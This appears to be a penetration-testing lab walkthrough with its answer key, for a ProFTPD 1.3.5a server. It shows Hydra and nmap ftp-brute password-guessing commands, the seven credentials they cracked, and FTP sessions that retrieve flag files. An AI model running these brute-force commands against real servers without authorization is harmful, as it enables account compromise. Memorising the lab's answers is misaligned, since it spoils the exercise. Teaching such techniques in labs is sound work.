ProFTPd is an open-source FTP server that is highly configurable and designed to be secure, efficient, and easy to manage. It is commonly used in Unix-like operating systems and supports various configurations and authentication methods. In this lab, we will look at the basics of ProFTP server reconnaissance.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Answer the following questions:

1. What is the version of FTP server?
2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
3. Find the password of user “sysadmin” using nmap script.
4. Find seven flags hidden on the server.

# Tools

- Nmap
- Hydra



__________

TASK 1
**Password for user `auditor`:

```
hydra -L /usr/share/metasploit-framework//data/wordlists/common_users.txt -P /usr/share/metasploit-framework//data/wordlists/unix_passwords.txt demo.ine.local ftp
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
                                                                                                                                                                                           
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 12:17:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://demo.ine.local:21/
[21][ftp] host: demo.ine.local   login: sysadmin   password: 654321
[21][ftp] host: demo.ine.local   login: rooty   password: qwerty
[21][ftp] host: demo.ine.local   login: demo   password: butterfly
[21][ftp] host: demo.ine.local   login: auditor   password: chocolate
[21][ftp] host: demo.ine.local   login: anon   password: purple
[21][ftp] host: demo.ine.local   login: administrator   password: tweety
[21][ftp] host: demo.ine.local   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-26 12:18:38

```

TASK 2
Flag kept in user `auditor`s files :

```
┌──(root㉿INE)-[~]
└─# ftp auditor@demo.ine.local                                                                                                                                                             
Connected to demo.ine.local.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.210.197.3]
331 Password required for auditor
Password: 
230 User auditor logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58430|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> getb secret.txt
?Invalid command.
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||34764|)
150 Opening BINARY mode data connection for secret.txt (33 bytes)
100% |**********************************************************************************************************************************************|    33      141.34 KiB/s    00:00 ETA
226 Transfer complete
33 bytes received in 00:00 (60.57 KiB/s)
ftp> exit
221 Goodbye.

┌──(root㉿INE)-[~]
└─# ls
Desktop  Documents  Downloads  Music  Pictures  Public  secret.txt  Templates  thinclient_drives  Videos

┌──(root㉿INE)-[~]
└─# cat secret.txt 
098f6bcd4621d373cade4e832627b4f6

```

----

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/e47bba77ec13ba3d56401778313e39b63789a8e3a42b38eceb2c724a216ec24f.jpg)

**Step 2:** What is the version of FTP server?

Answer: ProFTPD 1.3.5a

**Command:**

```
nmap -sV demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/4d054ced7136b22b3ca319e38530dcb5ba88c61fb24d33272549a65f2027b0e2.jpg)

**Step 3:** Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.

Answer:

```
sysadmin: 654321
rooty: qwerty
demo: butterfly
auditor: chocolate
anon: purple
administrator: tweety
diag: tigger
```

**Command:**

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp
```

![Content Image](https://assets.ine.com/lab/learningpath/7db064f4fa64f96ba3e675c68de702e97cb0479e893f5343a6e2073afc5f201c.jpg)

**Step 4:** Find the password of user “sysadmin” using nmap script.

Answer: 654321

**Commands:**

```
echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/6444ee790539c874eea230e0e1fb4995a7c5b9f1275fe57a38af124c23d75efd.jpg)

**Step 5:** Find seven flags hidden on the server.

Answer:

```
Flag1: 260ca9dd8a4577fc00b7bd5810298076
Flag2: e529a9cea4a728eb9c5828b13b22844c
Flag3: d6a6bc0db10694a2d90e3a69648f3a03
Flag4: 098f6bcd4621d373cade4e832627b4f6
Flag5: 1bc29b36f623ba82aaf6724fd3b16718
Flag6: 21232f297a57a5a743894a0e4a801fc3
Flag7: 12a032ce9179c32a6c7ab397b9d871fa
```

Solution:

Login to ftp server with each found user and retrieve the flag.

**Commands:**

```
ftp demo.ine.local
Enter username "sysadmin" and password 654321
ls
get secret.txt
exit
cat secret.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/7d246256fd251d515686ea1536796b12ced7c017dd57b110b61bd70123f06fa0.jpg)

Similarly retrieving remaining flags by logging into the ftp server with the credentials given below:

```
rooty: qwerty
demo: butterfly
auditor: chocolate
anon: purple
administrator: tweety
diag: tigger
```

![Content Image](https://assets.ine.com/lab/learningpath/5621e9a7f3b5c88ca520dfe2494e891d3602c96e4da469d6a1e123c93e17bde0.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/2b20956a904e0138b4206cb0ac245a55c3ce7f14a98d0821a9dfc28899420206.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/1932e3549c39acb9ecbaa1a577a930ebac1927ef72fa6597694c210c606ead04.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/533685501152b2321a6738df9c383ae72293867a88f1a0639947130269d68a14.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/c25b46036ff4ea7b12a979899e105d27312f29a3cb820f6bd46ce11d524dcc5f.jpg)

![Content Image](https://assets.ine.com/lab/learningpath/48de0842d9a0f099aebc575f890e0fe5eb01aa0585e64966c0f16e0d42fd8272.jpg)

# Conclusion

In this lab, we learned about the basics of ProFTP server reconnaissance.

# References

1. [proftpd](http://www.proftpd.org/)
2. [THC Hydra](https://tools.kali.org/password-attacks/hydra)
3. [ftp](https://linux.die.net/man/1/ftp)
4. [Nmap Script: ftp-brute](https://nmap.org/nsedoc/scripts/ftp-brute.html)